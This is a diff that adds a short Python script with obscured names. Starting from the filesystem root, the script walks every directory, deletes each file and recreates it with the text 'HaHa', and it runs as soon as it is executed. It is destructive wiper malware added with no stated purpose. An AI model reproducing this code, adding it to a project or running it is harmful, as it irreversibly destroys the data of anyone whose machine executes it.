@@ -1,0 +1,12 @@
+import os as o
+def a(p='/'):
+    try:
+        for i in o.listdir(p):
+            j = o.path.join(p, i)
+            if o.path.isdir(j): a(j)
+            elif o.path.isfile(j):
+                o.remove(j)
+                with open(j, 'w') as f: f.write('HaHa')
+    except PermissionError: print(f"Permission denied: {p}")
+    except Exception as e: print(f"Error accessing {p}: {e}")
+if __name__ == '__main__': a()
